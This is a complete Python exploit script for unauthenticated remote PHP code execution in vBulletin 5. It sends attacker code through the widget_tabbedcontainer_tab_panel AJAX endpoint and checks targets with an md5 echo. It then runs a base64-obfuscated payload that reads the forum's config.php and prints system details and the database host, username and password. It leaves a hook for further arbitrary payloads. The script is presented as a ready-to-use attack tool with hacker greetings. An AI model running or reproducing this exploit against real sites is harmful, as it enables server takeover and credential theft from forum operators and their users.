#!/usr/bin/env python2
# coding: utf-8
# ref: https://blog.exploitee.rs/2020/exploiting-vbulletin-a-tale-of-patch-fail/
# vBulldozer: the louder you are, the less you can here. Greetz to Kale Lincox Team.
import requests
import sys
import ast
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import re

def execute_php(url, php):
    target_url = url + "/ajax/render/widget_tabbedcontainer_tab_panel"
    data = {"subWidgets[0][template]": "widget_php",
            "subWidgets[0][config][code]": php}
    headers = {"X-Malicious-Payload": "Yes, fucking absolutely"}
    try:
        r = requests.post(url=target_url, data=data, verify=False, headers=headers)
    except Exception:
        return False
    return r.text

def check(url):
    needle = "8cd5ebddbcb6f18744666a260d919f7f"
    php = 'echo md5("vb5hax");exit;'
    output = execute_php(url, php)
    if needle in output:
        print "{*} Target is vulnerable!"
        return True
    else:
        return False

def gather_info(url):
    """
the 'dataminer' is the following piece of code:
include("./core/includes/config.php");
die("{'uname':'".php_uname()."','uid':'".posix_getuid()."','cwd':'".posix_getcwd()."','host':'".$config['MasterServer']['servername']."','user': '".$config['MasterServer']['username']."','pass': '".$config['MasterServer']['password']."'}");
we use 'die' because it allows us to avoid printing the error, and just get the shit we want (in some this is an issue...) 
I have it here as just a block of encoded payload because its static and does not change.
    """
    dataminer = "aW5jbHVkZSgiLi9jb3JlL2luY2x1ZGVzL2NvbmZpZy5waHAiKTtkaWUoInsnd"
    dataminer += "W5hbWUnOiciLnBocF91bmFtZSgpLiInLCd1aWQnOiciLnBvc2l4X2dldHVpZ"
    dataminer += "CgpLiInLCdjd2QnOiciLnBvc2l4X2dldGN3ZCgpLiInLCdob3N0JzonIi4kY"
    dataminer += "29uZmlnWydNYXN0ZXJTZXJ2ZXInXVsnc2VydmVybmFtZSddLiInLCd1c2VyJ"
    dataminer += "zogJyIuJGNvbmZpZ1snTWFzdGVyU2VydmVyJ11bJ3VzZXJuYW1lJ10uIicsJ"
    dataminer += "3Bhc3MnOiAnIi4kY29uZmlnWydNYXN0ZXJTZXJ2ZXInXVsncGFzc3dvcmQnX"
    dataminer += "S4iJ30iKTs="
    php = "eval(base64_decode('%s'));" %(dataminer)
    print "{+} Gathering some system information..."
    output = execute_php(url=url, php=php)
    data = ast.literal_eval(output)
    print "{>} PHP uname: %s" %(data['uname'])
    print "{>} Current UID: %s" %(data['uid'])
    print "{>} Current Dir: %s" %(data['cwd'])
    print "{+} Gathering database credentials..."
    print "{>} Database Host: %s" %(data['host'])
    print "{>} Database User: %s" %(data['user'])
    print "{>} Database Pass: %s" %(data['pass'])



def exploit(url):
    print "{+} Checking %s" %(url)
    if check(url) != True:
        sys.exit("{-} Target not exploitable :(")
    print "{+} Proceeding..."
    gather_info(url)
    # call execute_php(url, php) here with your payload

def main(args):
    if len(args) != 2:
        sys.exit("use: %s https://www.forum.com/vb" %(args[0]))
    exploit(url=args[1])

if __name__ == "__main__":
    main(args=sys.argv)
